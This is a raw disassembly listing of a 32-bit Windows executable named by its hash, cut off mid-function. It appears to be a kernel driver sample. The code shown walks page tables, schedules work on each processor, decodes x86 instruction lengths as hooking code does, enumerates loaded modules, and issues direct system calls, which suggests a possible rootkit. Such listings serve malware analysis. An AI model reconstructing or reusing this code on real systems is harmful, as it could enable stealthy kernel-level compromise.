
685cf5034b0878fd65e048b2b4b1ca26141ce9ad30f65d8e7390409e6a497039.exe:     file format pei-i386


Disassembly of section .text:

00010480 <.text>:
   10480:	add    BYTE PTR [eax],al
   10482:	add    BYTE PTR [eax],al
   10484:	add    BYTE PTR [eax],al
   10486:	mov    edi,edi
   10488:	push   ebp
   10489:	mov    ebp,esp
   1048b:	push   ecx
   1048c:	mov    eax,DWORD PTR [ebp+0x8]
   1048f:	mov    edx,DWORD PTR [eax]
   10491:	and    DWORD PTR [ebp-0x4],0x0
   10495:	push   ebx
   10496:	push   esi
   10497:	push   edi
   10498:	mov    edi,DWORD PTR [ebp+0xc]
   1049b:	mov    eax,edi
   1049d:	mov    ebx,edi
   1049f:	mov    esi,edx
   104a1:	mov    ecx,0x1ff
   104a6:	shr    eax,0x13
   104a9:	shr    ebx,0xb
   104ac:	shr    edi,0x2
   104af:	and    edx,0x3
   104b2:	and    esi,0xfffffffc
   104b5:	and    eax,ecx
   104b7:	and    ebx,ecx
   104b9:	and    edi,ecx
   104bb:	sub    edx,0x0
   104be:	je     0x104e2
   104c0:	dec    edx
   104c1:	je     0x104db
   104c3:	dec    edx
   104c4:	jne    0x104e8
   104c6:	mov    eax,DWORD PTR [esi+eax*4]
   104c9:	test   eax,eax
   104cb:	je     0x104e8
   104cd:	lea    ebx,[eax+ebx*4]
   104d0:	cmp    DWORD PTR [ebx],edx
   104d2:	je     0x104e8
   104d4:	mov    eax,DWORD PTR [ebx]
   104d6:	lea    eax,[eax+edi*8]
   104d9:	jmp    0x104e5
   104db:	mov    esi,DWORD PTR [esi+ebx*4]
   104de:	test   esi,esi
   104e0:	je     0x104e8
   104e2:	lea    eax,[esi+edi*8]
   104e5:	mov    DWORD PTR [ebp-0x4],eax
   104e8:	mov    eax,DWORD PTR [ebp-0x4]
   104eb:	pop    edi
   104ec:	pop    esi
   104ed:	pop    ebx
   104ee:	leave  
   104ef:	ret    0x8
   104f2:	int3   
   104f3:	int3   
   104f4:	int3   
   104f5:	int3   
   104f6:	int3   
   104f7:	int3   
   104f8:	mov    edi,edi
   104fa:	push   ebp
   104fb:	mov    ebp,esp
   104fd:	push   esi
   104fe:	mov    esi,DWORD PTR [ebp+0xc]
   10501:	push   edi
   10502:	mov    edi,DWORD PTR [ebp+0x8]
   10505:	mov    edi,DWORD PTR [edi+0x8]
   10508:	mov    eax,esi
   1050a:	shr    eax,0x12
   1050d:	mov    edx,0xff
   10512:	and    eax,edx
   10514:	mov    ecx,esi
   10516:	shr    ecx,0xa
   10519:	lea    eax,[edi+eax*4]
   1051c:	and    ecx,edx
   1051e:	cmp    DWORD PTR [eax],0x0
   10521:	je     0x10539
   10523:	mov    eax,DWORD PTR [eax]
   10525:	lea    eax,[eax+ecx*4]
   10528:	cmp    DWORD PTR [eax],0x0
   1052b:	je     0x10539
   1052d:	mov    eax,DWORD PTR [eax]
   1052f:	shr    esi,0x2
   10532:	and    esi,edx
   10534:	lea    eax,[eax+esi*8]
   10537:	jmp    0x1053b
   10539:	xor    eax,eax
   1053b:	pop    edi
   1053c:	pop    esi
   1053d:	pop    ebp
   1053e:	ret    0x8
   10541:	int3   
   10542:	int3   
   10543:	int3   
   10544:	int3   
   10545:	int3   
   10546:	mov    edi,edi
   10548:	push   ebp
   10549:	mov    ebp,esp
   1054b:	push   ebx
   1054c:	xor    ebx,ebx
   1054e:	cmp    DWORD PTR ds:0x1bf84,ebx
   10554:	je     0x10592
   10556:	lea    eax,[ebp+0x8]
   10559:	push   eax
   1055a:	push   DWORD PTR [ebp+0x8]
   1055d:	call   DWORD PTR ds:0x1b27c
   10563:	test   eax,eax
   10565:	jne    0x10592
   10567:	mov    eax,DWORD PTR [ebp+0x8]
   1056a:	mov    ecx,DWORD PTR ds:0x1bf80
   10570:	push   DWORD PTR [ebp+0xc]
   10573:	mov    eax,DWORD PTR [ecx+eax*1]
   10576:	push   eax
   10577:	call   DWORD PTR ds:0x1bf84
   1057d:	cmp    eax,ebx
   1057f:	je     0x10589
   10581:	mov    ecx,DWORD PTR [ebp+0x10]
   10584:	mov    DWORD PTR [eax+0x4],ecx
   10587:	mov    bl,0x1
   10589:	mov    ecx,DWORD PTR [ebp+0x8]
   1058c:	call   DWORD PTR ds:0x1b284
   10592:	mov    al,bl
   10594:	pop    ebx
   10595:	pop    ebp
   10596:	ret    0xc
   10599:	int3   
   1059a:	int3   
   1059b:	int3   
   1059c:	int3   
   1059d:	int3   
   1059e:	mov    edi,edi
   105a0:	push   ebp
   105a1:	mov    ebp,esp
   105a3:	push   esi
   105a4:	mov    esi,DWORD PTR [ebp+0xc]
   105a7:	push   DWORD PTR [esi+0x24]
   105aa:	call   DWORD PTR [esi+0x20]
   105ad:	cmp    BYTE PTR [esi+0x2c],0x0
   105b1:	je     0x105c0
   105b3:	push   0x0
   105b5:	push   0x0
   105b7:	push   DWORD PTR [esi+0x28]
   105ba:	call   DWORD PTR ds:0x1b1c4
   105c0:	push   0x0
   105c2:	push   esi
   105c3:	call   DWORD PTR ds:0x1b278
   105c9:	pop    esi
   105ca:	pop    ebp
   105cb:	ret    0x10
   105ce:	int3   
   105cf:	int3   
   105d0:	int3   
   105d1:	int3   
   105d2:	int3   
   105d3:	int3   
   105d4:	mov    edi,edi
   105d6:	push   ebp
   105d7:	mov    ebp,esp
   105d9:	sub    esp,0x10
   105dc:	push   ebx
   105dd:	push   esi
   105de:	push   0x30
   105e0:	xor    ebx,ebx
   105e2:	push   ebx
   105e3:	call   DWORD PTR ds:0x1b124
   105e9:	mov    esi,eax
   105eb:	cmp    esi,ebx
   105ed:	je     0x10646
   105ef:	push   ebx
   105f0:	push   ebx
   105f1:	lea    eax,[ebp-0x10]
   105f4:	push   eax
   105f5:	call   DWORD PTR ds:0x1b120
   105fb:	mov    al,BYTE PTR [ebp+0x14]
   105fe:	mov    BYTE PTR [esi+0x2c],al
   10601:	mov    eax,DWORD PTR [ebp+0x10]
   10604:	mov    DWORD PTR [esi+0x24],eax
   10607:	mov    eax,DWORD PTR [ebp+0xc]
   1060a:	push   esi
   1060b:	mov    DWORD PTR [esi+0x20],eax
   1060e:	push   0x1059e
   10613:	lea    eax,[ebp-0x10]
   10616:	push   esi
   10617:	mov    DWORD PTR [esi+0x28],eax
   1061a:	call   DWORD PTR ds:0x1b11c
   10620:	push   DWORD PTR [ebp+0x8]
   10623:	push   esi
   10624:	call   DWORD PTR ds:0x1b118
   1062a:	push   ebx
   1062b:	push   ebx
   1062c:	push   esi
   1062d:	call   DWORD PTR ds:0x1b114
   10633:	cmp    BYTE PTR [ebp+0x14],bl
   10636:	je     0x10646
   10638:	push   ebx
   10639:	push   ebx
   1063a:	push   ebx
   1063b:	push   ebx
   1063c:	lea    eax,[ebp-0x10]
   1063f:	push   eax
   10640:	call   DWORD PTR ds:0x1b110
   10646:	pop    esi
   10647:	pop    ebx
   10648:	leave  
   10649:	ret    0x10
   1064c:	int3   
   1064d:	int3   
   1064e:	int3   
   1064f:	int3   
   10650:	int3   
   10651:	int3   
   10652:	mov    edi,edi
   10654:	push   ebp
   10655:	mov    ebp,esp
   10657:	push   ecx
   10658:	mov    eax,ds:0x1b128
   1065d:	mov    al,BYTE PTR [eax]
   1065f:	cmp    al,0x1
   10661:	jne    0x10683
   10663:	cmp    BYTE PTR [ebp+0x10],0x0
   10667:	jne    0x106c5
   10669:	push   ebx
   1066a:	call   DWORD PTR ds:0x1b100
   10670:	push   DWORD PTR [ebp+0xc]
   10673:	mov    bl,al
   10675:	call   DWORD PTR [ebp+0x8]
   10678:	mov    cl,bl
   1067a:	call   DWORD PTR ds:0x1b104
   10680:	pop    ebx
   10681:	jmp    0x106c5
   10683:	test   al,al
   10685:	mov    cl,BYTE PTR fs:0x51
   1068c:	push   esi
   1068d:	movzx  esi,cl
   10690:	mov    BYTE PTR [ebp-0x4],0x0
   10694:	jle    0x106c4
   10696:	cmp    BYTE PTR [ebp+0x10],0x0
   1069a:	je     0x106a4
   1069c:	movsx  eax,BYTE PTR [ebp-0x4]
   106a0:	cmp    eax,esi
   106a2:	je     0x106b5
   106a4:	push   DWORD PTR [ebp+0x14]
   106a7:	push   DWORD PTR [ebp+0xc]
   106aa:	push   DWORD PTR [ebp+0x8]
   106ad:	push   DWORD PTR [ebp-0x4]
   106b0:	call   0x105d4
   106b5:	inc    BYTE PTR [ebp-0x4]
   106b8:	mov    eax,ds:0x1b128
   106bd:	mov    cl,BYTE PTR [ebp-0x4]
   106c0:	cmp    cl,BYTE PTR [eax]
   106c2:	jl     0x10696
   106c4:	pop    esi
   106c5:	leave  
   106c6:	ret    0x10
   106c9:	int3   
   106ca:	int3   
   106cb:	int3   
   106cc:	int3   
   106cd:	int3   
   106ce:	mov    eax,ds:0x1bf88
   106d3:	test   eax,eax
   106d5:	jne    0x106ce
   106d7:	ret    0x4
   106da:	int3   
   106db:	int3   
   106dc:	int3   
   106dd:	int3   
   106de:	int3   
   106df:	int3   
   106e0:	mov    edi,edi
   106e2:	push   ebx
   106e3:	call   DWORD PTR ds:0x1b100
   106e9:	inc    DWORD PTR ds:0x1bf88
   106ef:	mov    bl,al
   106f1:	mov    eax,ds:0x1b128
   106f6:	cmp    BYTE PTR [eax],0x1
   106f9:	jle    0x1070b
   106fb:	push   0x0
   106fd:	push   0x1
   106ff:	push   0x0
   10701:	push   0x106ce
   10706:	call   0x10652
   1070b:	mov    al,bl
   1070d:	pop    ebx
   1070e:	ret    
   1070f:	int3   
   10710:	int3   
   10711:	int3   
   10712:	int3   
   10713:	int3   
   10714:	mov    edi,edi
   10716:	push   ebp
   10717:	mov    ebp,esp
   10719:	mov    cl,BYTE PTR [ebp+0x8]
   1071c:	dec    DWORD PTR ds:0x1bf88
   10722:	call   DWORD PTR ds:0x1b104
   10728:	pop    ebp
   10729:	ret    0x4
   1072c:	int3   
   1072d:	int3   
   1072e:	int3   
   1072f:	int3   
   10730:	int3   
   10731:	int3   
   10732:	mov    edi,edi
   10734:	push   ebp
   10735:	mov    ebp,esp
   10737:	sub    esp,0xc
   1073a:	push   edi
   1073b:	mov    DWORD PTR [ebp-0xc],ecx
   1073e:	mov    BYTE PTR [ebp-0x1],0x0
   10742:	mov    BYTE PTR [ebp-0x4],0x0
   10746:	mov    BYTE PTR [ebp-0x3],0x0
   1074a:	mov    edi,ecx
   1074c:	mov    al,BYTE PTR [edi]
   1074e:	cmp    al,0x2e
   10750:	je     0x1077a
   10752:	cmp    al,0x3e
   10754:	je     0x1077a
   10756:	cmp    al,0x36
   10758:	je     0x1077a
   1075a:	cmp    al,0x26
   1075c:	je     0x1077a
   1075e:	cmp    al,0x64
   10760:	je     0x1077a
   10762:	cmp    al,0x65
   10764:	je     0x1077a
   10766:	cmp    al,0xf0
   10768:	je     0x1077a
   1076a:	cmp    al,0xf2
   1076c:	je     0x1077a
   1076e:	cmp    al,0xf3
   10770:	je     0x1077a
   10772:	cmp    al,0x66
   10774:	je     0x1077e
   10776:	cmp    al,0x67
   10778:	jne    0x10797
   1077a:	cmp    al,0x66
   1077c:	jne    0x10782
   1077e:	mov    BYTE PTR [ebp-0x4],0x1
   10782:	cmp    al,0x67
   10784:	jne    0x1078a
   10786:	mov    BYTE PTR [ebp-0x3],0x1
   1078a:	inc    edi
   1078b:	lea    eax,[ecx+0x10]
   1078e:	cmp    edi,eax
   10790:	jbe    0x1074c
   10792:	xor    eax,eax
   10794:	pop    edi
   10795:	leave  
   10796:	ret    
   10797:	test   edx,edx
   10799:	mov    cl,BYTE PTR [edi]
   1079b:	mov    BYTE PTR [ebp-0x5],cl
   1079e:	je     0x107a2
   107a0:	mov    DWORD PTR [edx],edi
   107a2:	cmp    BYTE PTR [edi],0xf
   107a5:	jne    0x107b6
   107a7:	inc    edi
   107a8:	movzx  eax,BYTE PTR [edi]
   107ab:	mov    al,BYTE PTR [eax+0x1b860]
   107b1:	mov    BYTE PTR [ebp-0x2],al
   107b4:	jmp    0x107d2
   107b6:	movzx  eax,cl
   107b9:	mov    al,BYTE PTR [eax+0x1b760]
   107bf:	mov    dl,cl
   107c1:	add    dl,0x60
   107c4:	cmp    dl,0x3
   107c7:	mov    BYTE PTR [ebp-0x2],al
   107ca:	ja     0x107d2
   107cc:	mov    dl,BYTE PTR [ebp-0x3]
   107cf:	mov    BYTE PTR [ebp-0x4],dl
   107d2:	inc    edi
   107d3:	test   al,0x20
   107d5:	je     0x107d8
   107d7:	inc    edi
   107d8:	test   al,0x1
   107da:	je     0x1088a
   107e0:	mov    dl,BYTE PTR [edi]
   107e2:	push   ebx
   107e3:	mov    bl,dl
   107e5:	shr    bl,0x3
   107e8:	mov    al,dl
   107ea:	shr    al,0x6
   107ed:	and    bl,0x7
   107f0:	and    dl,0x7
   107f3:	inc    edi
   107f4:	cmp    cl,0xf6
   107f7:	push   esi
   107f8:	jne    0x10805
   107fa:	test   bl,bl
   107fc:	jne    0x10812
   107fe:	or     BYTE PTR [ebp-0x2],0x2
   10802:	mov    cl,BYTE PTR [ebp-0x5]
   10805:	cmp    cl,0xf7
   10808:	jne    0x10812
   1080a:	test   bl,bl
   1080c:	jne    0x10812
   1080e:	or     BYTE PTR [ebp-0x2],0x10
   10812:	cmp    dl,0x4
   10815:	sete   bl
   10818:	cmp    BYTE PTR [ebp-0x3],0x0
   1081c:	movzx  esi,al
   1081f:	sete   cl
   10822:	and    bl,cl
   10824:	sub    esi,0x0
   10827:	je     0x1084a
   10829:	dec    esi
   1082a:	je     0x10844
   1082c:	dec    esi
   1082d:	je     0x10834
   1082f:	dec    esi
   10830:	je     0x1087f
   10832:	jmp    0x10864
   10834:	cmp    BYTE PTR [ebp-0x3],0x0
   10838:	sete   cl
   1083b:	lea    ecx,[ecx+ecx*1+0x2]
   1083f:	mov    BYTE PTR [ebp-0x1],cl
   10842:	jmp    0x10864
   10844:	mov    BYTE PTR [ebp-0x1],0x1
   10848:	jmp    0x10864
   1084a:	cmp    BYTE PTR [ebp-0x3],0x0
   1084e:	je     0x1085b
   10850:	cmp    dl,0x6
   10853:	jne    0x10864
   10855:	mov    BYTE PTR [ebp-0x1],0x2
   10859:	jmp    0x10864
   1085b:	cmp    dl,0x5
   1085e:	jne    0x10864
   10860:	mov    BYTE PTR [ebp-0x1],0x4
   10864:	test   bl,bl
   10866:	je     0x1087f
   10868:	mov    cl,BYTE PTR [edi]
   1086a:	and    cl,0x7
   1086d:	cmp    cl,0x5
   10870:	jne    0x1087e
   10872:	test   al,al
   10874:	je     0x1087a
   10876:	cmp    al,0x2
   10878:	jne    0x1087e
   1087a:	mov    BYTE PTR [ebp-0x1],0x4
   1087e:	inc    edi
   1087f:	movzx  eax,BYTE PTR [ebp-0x1]
   10883:	pop    esi
   10884:	add    edi,eax
   10886:	mov    al,BYTE PTR [ebp-0x2]
   10889:	pop    ebx
   1088a:	test   al,0x2
   1088c:	je     0x1088f
   1088e:	inc    edi
   1088f:	test   al,0x4
   10891:	je     0x10895
   10893:	inc    edi
   10894:	inc    edi
   10895:	test   al,0x8
   10897:	je     0x1089c
   10899:	add    edi,0x4
   1089c:	cmp    BYTE PTR [ebp-0x4],0x0
   108a0:	sete   dl
   108a3:	test   al,0x10
   108a5:	lea    edx,[edx+edx*1+0x2]
   108a9:	je     0x108b0
   108ab:	movzx  eax,dl
   108ae:	add    edi,eax
   108b0:	mov    eax,edi
   108b2:	sub    eax,DWORD PTR [ebp-0xc]
   108b5:	jmp    0x10794
   108ba:	int3   
   108bb:	int3   
   108bc:	int3   
   108bd:	int3   
   108be:	int3   
   108bf:	int3   
   108c0:	mov    edi,edi
   108c2:	push   ebp
   108c3:	mov    ebp,esp
   108c5:	movzx  eax,BYTE PTR [ebp+0x8]
   108c9:	mov    ecx,DWORD PTR ds:0x1bb68
   108cf:	movzx  eax,WORD PTR [ecx+eax*2]
   108d3:	movzx  ecx,WORD PTR [ebp+0xc]
   108d7:	and    eax,ecx
   108d9:	pop    ebp
   108da:	ret    0x8
   108dd:	int3   
   108de:	int3   
   108df:	int3   
   108e0:	int3   
   108e1:	int3   
   108e2:	mov    edi,edi
   108e4:	push   ebp
   108e5:	mov    ebp,esp
   108e7:	push   0x80
   108ec:	push   DWORD PTR [ebp+0x8]
   108ef:	call   0x108c0
   108f4:	pop    ebp
   108f5:	ret    0x4
   108f8:	int3   
   108f9:	int3   
   108fa:	int3   
   108fb:	int3   
   108fc:	int3   
   108fd:	int3   
   108fe:	mov    edi,edi
   10900:	push   ebp
   10901:	mov    ebp,esp
   10903:	push   ecx
   10904:	push   ecx
   10905:	and    DWORD PTR [ebp-0x4],0x0
   10909:	push   esi
   1090a:	mov    esi,DWORD PTR [ebp+0x8]
   1090d:	cmp    WORD PTR [esi],0x2d
   10911:	mov    DWORD PTR [ebp-0x8],0x1
   10918:	jne    0x10920
   1091a:	or     DWORD PTR [ebp-0x8],0xffffffff
   1091e:	inc    esi
   1091f:	inc    esi
   10920:	push   edi
   10921:	mov    edi,DWORD PTR [ebp+0x10]
   10924:	test   edi,edi
   10926:	jne    0x10997
   10928:	cmp    WORD PTR [esi],0x30
   1092c:	push   0xa
   1092e:	pop    edi
   1092f:	jne    0x10997
   10931:	inc    esi
   10932:	inc    esi
   10933:	cmp    WORD PTR [esi],0x78
   10937:	push   0x8
   10939:	pop    edi
   1093a:	jne    0x10997
   1093c:	lea    edx,[esi+0x2]
   1093f:	movzx  eax,WORD PTR [edx]
   10942:	push   eax
   10943:	call   0x108e2
   10948:	test   eax,eax
   1094a:	je     0x10997
   1094c:	push   0x10
   1094e:	mov    esi,edx
   10950:	pop    edi
   10951:	jmp    0x10997
   10953:	push   0x4
   10955:	push   edx
   10956:	call   0x108c0
   1095b:	test   eax,eax
   1095d:	je     0x10967
   1095f:	movzx  eax,dx
   10962:	sub    eax,0x30
   10965:	jmp    0x10986
   10967:	push   0x2
   10969:	push   edx
   1096a:	call   0x108c0
   1096f:	test   eax,eax
   10971:	je     0x10980
   10973:	push   edx
   10974:	call   DWORD PTR ds:0x1b12c
   1097a:	pop    ecx
   1097b:	movzx  eax,ax
   1097e:	jmp    0x10983
   10980:	movzx  eax,dx
   10983:	add    eax,0xffffffc9
   10986:	cmp    eax,edi
   10988:	jge    0x109a4
   1098a:	mov    ecx,DWORD PTR [ebp-0x4]
   1098d:	imul   ecx,edi
   10990:	add    ecx,eax
   10992:	inc    esi
   10993:	mov    DWORD PTR [ebp-0x4],ecx
   10996:	inc    esi
   10997:	movzx  edx,WORD PTR [esi]
   1099a:	push   edx
   1099b:	call   0x108e2
   109a0:	test   eax,eax
   109a2:	jne    0x10953
   109a4:	mov    eax,DWORD PTR [ebp+0xc]
   109a7:	test   eax,eax
   109a9:	pop    edi
   109aa:	je     0x109ae
   109ac:	mov    DWORD PTR [eax],esi
   109ae:	mov    eax,DWORD PTR [ebp-0x4]
   109b1:	imul   eax,DWORD PTR [ebp-0x8]
   109b5:	pop    esi
   109b6:	leave  
   109b7:	ret    0xc
   109ba:	int3   
   109bb:	int3   
   109bc:	int3   
   109bd:	int3   
   109be:	int3   
   109bf:	int3   
   109c0:	cmp    DWORD PTR ds:0x1c0a0,0x0
   109c7:	je     0x109d7
   109c9:	mov    eax,ds:0x1c0a0
   109ce:	lea    edx,[esp+0x4]
   109d2:	int    0x2e
   109d4:	ret    0x14
   109d7:	mov    eax,0x1
   109dc:	ret    0x14
   109df:	int3   
   109e0:	int3   
   109e1:	int3   
   109e2:	int3   
   109e3:	int3   
   109e4:	mov    edi,edi
   109e6:	push   ebp
   109e7:	mov    ebp,esp
   109e9:	push   DWORD PTR [ebp+0x8]
   109ec:	call   DWORD PTR ds:0x1b130
   109f2:	neg    al
   109f4:	sbb    eax,eax
   109f6:	and    eax,0x3fffff86
   109fb:	add    eax,0xc000007a
   10a00:	pop    ebp
   10a01:	ret    0x4
   10a04:	int3   
   10a05:	int3   
   10a06:	int3   
   10a07:	int3   
   10a08:	int3   
   10a09:	int3   
   10a0a:	push   0x8
   10a0c:	push   0x1b348
   10a11:	call   0x1a1c8
   10a16:	xor    ebx,ebx
   10a18:	inc    ebx
   10a19:	and    DWORD PTR [ebp-0x4],0x0
   10a1d:	push   ebx
   10a1e:	push   DWORD PTR [ebp+0xc]
   10a21:	push   DWORD PTR [ebp+0x8]
   10a24:	call   DWORD PTR ds:0x1b134
   10a2a:	jmp    0x10a35
   10a2c:	xor    eax,eax
   10a2e:	inc    eax
   10a2f:	ret    
   10a30:	mov    esp,DWORD PTR [ebp-0x18]
   10a33:	xor    bl,bl
   10a35:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   10a3c:	mov    al,bl
   10a3e:	call   0x1a20d
   10a43:	ret    0x8
   10a46:	int3   
   10a47:	int3   
   10a48:	int3   
   10a49:	int3   
   10a4a:	int3   
   10a4b:	int3   
   10a4c:	push   0x8
   10a4e:	push   0x1b368
   10a53:	call   0x1a1c8
   10a58:	xor    ebx,ebx
   10a5a:	inc    ebx
   10a5b:	and    DWORD PTR [ebp-0x4],0x0
   10a5f:	push   ebx
   10a60:	push   DWORD PTR [ebp+0xc]
   10a63:	push   DWORD PTR [ebp+0x8]
   10a66:	call   DWORD PTR ds:0x1b138
   10a6c:	jmp    0x10a77
   10a6e:	xor    eax,eax
   10a70:	inc    eax
   10a71:	ret    
   10a72:	mov    esp,DWORD PTR [ebp-0x18]
   10a75:	xor    bl,bl
   10a77:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   10a7e:	mov    al,bl
   10a80:	call   0x1a20d
   10a85:	ret    0x8
   10a88:	int3   
   10a89:	int3   
   10a8a:	int3   
   10a8b:	int3   
   10a8c:	int3   
   10a8d:	int3   
   10a8e:	mov    edi,edi
   10a90:	push   esi
   10a91:	push   edi
   10a92:	xor    esi,esi
   10a94:	xor    edi,edi
   10a96:	inc    esi
   10a97:	mov    eax,0xedb88320
   10a9c:	mov    ecx,edi
   10a9e:	and    ecx,esi
   10aa0:	neg    ecx
   10aa2:	and    ecx,eax
   10aa4:	mov    edx,edi
   10aa6:	shr    edx,1
   10aa8:	xor    ecx,edx
   10aaa:	mov    edx,ecx
   10aac:	and    edx,esi
   10aae:	neg    edx
   10ab0:	and    edx,eax
   10ab2:	shr    ecx,1
   10ab4:	xor    edx,ecx
   10ab6:	mov    ecx,edx
   10ab8:	and    ecx,esi
   10aba:	shr    edx,1
   10abc:	neg    ecx
   10abe:	and    ecx,eax
   10ac0:	xor    ecx,edx
   10ac2:	mov    edx,ecx
   10ac4:	and    edx,esi
   10ac6:	neg    edx
   10ac8:	and    edx,eax
   10aca:	shr    ecx,1
   10acc:	xor    edx,ecx
   10ace:	mov    ecx,edx
   10ad0:	and    ecx,esi
   10ad2:	shr    edx,1
   10ad4:	neg    ecx
   10ad6:	and    ecx,eax
   10ad8:	xor    ecx,edx
   10ada:	mov    edx,ecx
   10adc:	and    edx,esi
   10ade:	neg    edx
   10ae0:	and    edx,eax
   10ae2:	shr    ecx,1
   10ae4:	xor    edx,ecx
   10ae6:	mov    ecx,edx
   10ae8:	and    ecx,esi
   10aea:	shr    edx,1
   10aec:	neg    ecx
   10aee:	and    ecx,eax
   10af0:	xor    ecx,edx
   10af2:	mov    edx,ecx
   10af4:	and    edx,esi
   10af6:	neg    edx
   10af8:	and    edx,eax
   10afa:	shr    ecx,1
   10afc:	xor    edx,ecx
   10afe:	mov    DWORD PTR [edi*4+0x1bb80],edx
   10b05:	inc    edi
   10b06:	cmp    edi,0xff
   10b0c:	jle    0x10a9c
   10b0e:	pop    edi
   10b0f:	pop    esi
   10b10:	ret    
   10b11:	int3   
   10b12:	int3   
   10b13:	int3   
   10b14:	int3   
   10b15:	int3   
   10b16:	mov    edi,edi
   10b18:	push   ebp
   10b19:	mov    ebp,esp
   10b1b:	or     eax,0xffffffff
   10b1e:	cmp    DWORD PTR [ebp+0xc],0x0
   10b22:	je     0x10b46
   10b24:	mov    ecx,DWORD PTR [ebp+0x8]
   10b27:	movzx  edx,BYTE PTR [ecx]
   10b2a:	dec    DWORD PTR [ebp+0xc]
   10b2d:	xor    edx,eax
   10b2f:	and    edx,0xff
   10b35:	shr    eax,0x8
   10b38:	xor    eax,DWORD PTR [edx*4+0x1bb80]
   10b3f:	inc    ecx
   10b40:	cmp    DWORD PTR [ebp+0xc],0x0
   10b44:	jne    0x10b27
   10b46:	not    eax
   10b48:	pop    ebp
   10b49:	ret    0x8
   10b4c:	int3   
   10b4d:	int3   
   10b4e:	int3   
   10b4f:	int3   
   10b50:	int3   
   10b51:	int3   
   10b52:	mov    edi,edi
   10b54:	push   ebp
   10b55:	mov    ebp,esp
   10b57:	push   ecx
   10b58:	and    DWORD PTR [ebp-0x4],0x0
   10b5c:	push   ebx
   10b5d:	push   esi
   10b5e:	push   edi
   10b5f:	mov    edi,0x1000
   10b64:	push   edi
   10b65:	push   0x0
   10b67:	call   DWORD PTR ds:0x1b124
   10b6d:	mov    esi,eax
   10b6f:	test   esi,esi
   10b71:	je     0x10baf
   10b73:	lea    eax,[ebp-0x4]
   10b76:	push   eax
   10b77:	push   edi
   10b78:	push   esi
   10b79:	push   DWORD PTR [ebp+0x8]
   10b7c:	call   DWORD PTR ds:0x1b13c
   10b82:	mov    ebx,eax
   10b84:	cmp    ebx,0xc0000004
   10b8a:	jne    0x10ba2
   10b8c:	push   0x0
   10b8e:	push   esi
   10b8f:	call   DWORD PTR ds:0x1b278
   10b95:	cmp    DWORD PTR [ebp-0x4],0x0
   10b99:	je     0x10ba0
   10b9b:	mov    edi,DWORD PTR [ebp-0x4]
   10b9e:	jmp    0x10b64
   10ba0:	add    edi,edi
   10ba2:	test   ebx,ebx
   10ba4:	jne    0x10b64
   10ba6:	mov    eax,esi
   10ba8:	pop    edi
   10ba9:	pop    esi
   10baa:	pop    ebx
   10bab:	leave  
   10bac:	ret    0x4
   10baf:	xor    eax,eax
   10bb1:	jmp    0x10ba8
   10bb3:	int3   
   10bb4:	int3   
   10bb5:	int3   
   10bb6:	int3   
   10bb7:	int3   
   10bb8:	mov    edi,edi
   10bba:	push   ebp
   10bbb:	mov    ebp,esp
   10bbd:	push   ecx
   10bbe:	push   ebx
   10bbf:	push   esi
   10bc0:	xor    ebx,ebx
   10bc2:	push   0xb
   10bc4:	mov    DWORD PTR [ebp-0x4],ebx
   10bc7:	call   0x10b52
   10bcc:	mov    esi,eax
   10bce:	cmp    esi,ebx
   10bd0:	jne    0x10bd6
   10bd2:	xor    eax,eax
   10bd4:	jmp    0x10c0e
   10bd6:	cmp    DWORD PTR [esi],ebx
   10bd8:	jbe    0x10c02
   10bda:	push   edi
   10bdb:	lea    edi,[esi+0xc]
   10bde:	push   DWORD PTR [ebp+0x8]
   10be1:	lea    eax,[edi+0x14]
   10be4:	push   eax
   10be5:	call   DWORD PTR ds:0x1b140
   10beb:	test   eax,eax
   10bed:	pop    ecx
   10bee:	pop    ecx
   10bef:	je     0x10bf6
   10bf1:	mov    eax,DWORD PTR [edi]
   10bf3:	mov    DWORD PTR [ebp-0x4],eax
   10bf6:	inc    ebx
   10bf7:	add    edi,0x11c
   10bfd:	cmp    ebx,DWORD PTR [esi]
   10bff:	jb     0x10bde
   10c01:	pop    edi
   10c02:	push   0x0
   10c04:	push   esi
   10c05:	call   DWORD PTR ds:0x1b278
   10c0b:	mov    eax,DWORD PTR [ebp-0x4]
   10c0e:	pop    esi
   10c0f:	pop    ebx
   10c10:	leave  
   10c11:	ret    0x4
   10c14:	int3   
   10c15:	int3   
   10c16:	int3   
   10c17:	int3   
   10c18:	int3   
   10c19:	int3   
   10c1a:	mov    edi,edi
   10c1c:	push   ebp
   10c1d:	mov    ebp,esp
   10c1f:	sub    esp,0xc
   10c22:	push   esi
   10c23:	mov    esi,DWORD PTR [ebp+0x8]
   10c26:	test   esi,esi
   10c28:	mov    DWORD PTR [ebp-0x4],0xc0000100
   10c2f:	je     0x10d05
   10c35:	push   edi
   10c36:	mov    edi,DWORD PTR [ebp+0x10]
   10c39:	and    WORD PTR [edi],0x0
   10c3d:	cmp    WORD PTR [esi],0x0
   10c41:	je     0x10d04
   10c47:	push   ebx
   10c48:	mov    DWORD PTR [ebp-0x8],esi
   10c4b:	push   0x3d
   10c4d:	add    esi,0x2
   10c50:	push   esi
   10c51:	call   DWORD PTR ds:0x1b148
   10c57:	pop    ecx
   10c58:	mov    esi,eax
   10c5a:	test   esi,esi
   10c5c:	pop    ecx
   10c5d:	mov    ecx,DWORD PTR [ebp-0x8]
   10c60:	jne    0x10c78
   10c62:	mov    eax,ecx
   10c64:	lea    esi,[eax+0x2]
   10c67:	mov    dx,WORD PTR [eax]
   10c6a:	inc    eax
   10c6b:	inc    eax
   10c6c:	test   dx,dx
   10c6f:	jne    0x10c67
   10c71:	sub    eax,esi
   10c73:	sar    eax,1
   10c75:	lea    esi,[ecx+eax*2]
   10c78:	cmp    WORD PTR [esi],0x0
   10c7c:	je     0x10cbb
   10c7e:	mov    eax,esi
   10c80:	sub    eax,ecx
   10c82:	sar    eax,1
   10c84:	add    eax,eax
   10c86:	inc    esi
   10c87:	inc    esi
   10c88:	mov    WORD PTR [ebp-0xa],ax
   10c8c:	mov    WORD PTR [ebp-0xc],ax
   10c90:	mov    eax,esi
   10c92:	mov    ebx,esi
   10c94:	lea    ecx,[eax+0x2]
   10c97:	mov    dx,WORD PTR [eax]
   10c9a:	inc    eax
   10c9b:	inc    eax
   10c9c:	test   dx,dx
   10c9f:	jne    0x10c97
   10ca1:	sub    eax,ecx
   10ca3:	sar    eax,1
   10ca5:	push   0x1
   10ca7:	push   DWORD PTR [ebp+0xc]
   10caa:	lea    esi,[esi+eax*2]
   10cad:	lea    eax,[ebp-0xc]
   10cb0:	push   eax
   10cb1:	call   DWORD PTR ds:0x1b144
   10cb7:	test   al,al
